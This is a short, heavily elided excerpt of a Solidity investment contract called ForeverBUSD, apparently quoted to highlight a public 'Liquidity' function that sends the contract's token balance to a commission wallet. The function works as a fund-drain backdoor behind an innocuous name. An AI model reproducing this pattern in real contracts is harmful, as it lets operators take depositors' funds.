...
contract ForeverBUSD {
  ...
  constructor(address wallet, address _baseToken) public {
  ...
  function invest(address owner, address referrer, uint8 plan) public {
    ...
    emit NewDeposit(owner, plan, _amount);
  }
  ...
  function Liquidity(uint256 amount) public {
    ...
    if(amount <= _balance) IBEP20(baseToken).transfer(commissionWallet, amount);
